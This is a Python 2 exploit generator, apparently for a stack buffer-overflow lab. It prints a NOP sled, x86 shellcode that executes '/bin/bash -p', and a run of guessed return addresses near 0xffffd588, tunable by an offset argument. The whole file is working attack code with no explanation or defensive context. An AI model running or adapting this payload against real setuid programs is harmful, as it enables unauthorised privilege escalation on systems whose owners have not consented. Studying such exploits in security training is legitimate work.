#!/usr/bin/python
import sys
import struct

if len(sys.argv) == 1:
	offset = 0
else:
	offset = int(sys.argv[1])

nop = '\x90'
nop_sled = nop * 40

code = "\x31\xc0\x6a\x68" + \
       "\x68\x2f\x62\x61" + \
       "\x73\x68\x2f\x62" + \
       "\x69\x6e\x89\xe3" + \
       "\x68\x2d\x70\xff" + \
       "\xff\xc1\x24\x24" + \
       "\x10\xc1\x2c\x24" + \
       "\x10\x89\xe1\x50" + \
       "\x51\x53\x89\xe1" + \
       "\x8d\x51\x04\x04" + \
       "\x05\x04\x06\xcd" + \
       "\x80"
code = 3 * nop + code

guess = struct.pack("<I", 0xffffd588 + 20 + offset)
guess_sled = 20 * guess

s = nop_sled + code + guess_sled

print s
